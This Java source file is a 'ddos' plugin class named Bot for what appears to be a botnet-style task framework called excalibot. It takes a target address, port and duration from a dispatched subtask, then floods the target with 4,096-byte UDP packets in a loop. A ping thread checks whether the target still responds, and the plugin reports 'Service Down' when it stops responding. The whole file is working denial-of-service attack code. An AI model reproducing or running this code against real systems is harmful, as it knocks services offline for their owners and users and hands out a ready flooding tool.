package org.powertrip.excalibot.common.plugins.ddos;

import org.powertrip.excalibot.common.com.SubTask;
import org.powertrip.excalibot.common.com.SubTaskResult;
import org.powertrip.excalibot.common.plugins.KnightPlug;
import org.powertrip.excalibot.common.plugins.interfaces.knight.ResultManagerInterface;

import java.io.IOException;
import java.net.*;

/**
 * Created by Tiago on 04/01/2016.
 * 04:12
 */
public class Bot extends KnightPlug{
	public Bot(ResultManagerInterface resultManager) {
		super(resultManager);
	}

	@Override
	public boolean run(SubTask subTask) {
		SubTaskResult result = subTask.createResult();
		int port= Integer.parseInt(subTask.getParameter("port"));
		String address = subTask.getParameter("address");
		int totalTime=Integer.parseInt(subTask.getParameter("time"));
        Ping test_ping=new Ping(address,500);
        int init_ping,flag_ping=0,aux_time=1;
        long update_time=5000;
        System.out.println("Bot responding");
		try {
            test_ping.start();
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                System.err.println("Problem with sleep");
            }
            init_ping=test_ping.get_state()? 1:-1;
            long startTime = System.currentTimeMillis();
			update_time=5000;
            aux_time=1;
            boolean toFinish = false;
			DatagramSocket socket = null;
			byte[] data = new byte[4096];
			socket = new DatagramSocket();
			socket.setSoTimeout(500);
			socket.setTrafficClass(0x02 | 0x04 | 0x08 | 0x10);
			while (!toFinish) {
				socket.connect(new InetSocketAddress(address, port));
				socket.send(new DatagramPacket(data, data.length));
				toFinish = (System.currentTimeMillis() - startTime >= totalTime);
                if(init_ping>0) {
                    if(test_ping.get_state())
                        flag_ping=0;
                    else
                        flag_ping--;
                }
                if(System.currentTimeMillis()-startTime>=update_time*aux_time){
                    if(flag_ping<-15) {
                        break;
                    }
                    else
                        result
                                .setResponse("stdout", "Service still works")
                                .setResponse("stdout", "Time: "+String.valueOf(update_time * aux_time));
                    aux_time++;
                    System.out.println("Flag_ping: "+flag_ping);
				}
			}
            test_ping.join();
			socket.close();
		} catch (SocketException ex) {
			result
					.setSuccessful(false)
					.setResponse("stdout", "Socket failed");
			System.err.println("Fail being annoying on socket");
		} catch (IOException ex) {
			result
					.setSuccessful(false)
					.setResponse("stdout", "Annoying failed")
					.setResponse("exception", ex.toString());
			System.err.println("Fail being annoying ");
		} catch (InterruptedException e) {
            e.printStackTrace();
        }
        try {
            if(flag_ping<-15){
                result
                        .setSuccessful(true)
                        .setResponse("state", "Service Down")
                        .setResponse("time", String.valueOf(update_time * aux_time));
            }
            else
                result
                        .setSuccessful(true)
                        .setResponse("state", "Status of service Unknown")
                        .setResponse("time", String.valueOf(update_time * aux_time));
			resultManager.returnResult(result);
			return result.isSuccessful();
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
		return false;
	}
}
